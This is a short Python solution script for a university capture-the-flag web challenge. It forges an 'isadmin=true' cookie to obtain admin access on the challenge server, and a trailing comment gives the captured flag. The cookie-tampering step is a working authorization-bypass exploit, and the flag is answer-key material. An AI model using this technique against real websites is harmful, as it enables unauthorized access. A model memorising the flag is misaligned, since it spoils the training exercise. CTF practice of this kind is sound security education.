import requests
IP = 'http://ctf99.cs.ui.ac.id:9002/'
response = requests.post(IP)
print(response.text)
response_cookies = response.cookies
print(response_cookies)

response_cookies.set(name='isadmin', value='true', domain='ctf99.cs.ui.ac.id', path='/')
print(response_cookies)

response = requests.get(IP, cookies=response_cookies)
print(response.text)  # CSCE604258{be_4n_4dm1n_is_Ez}
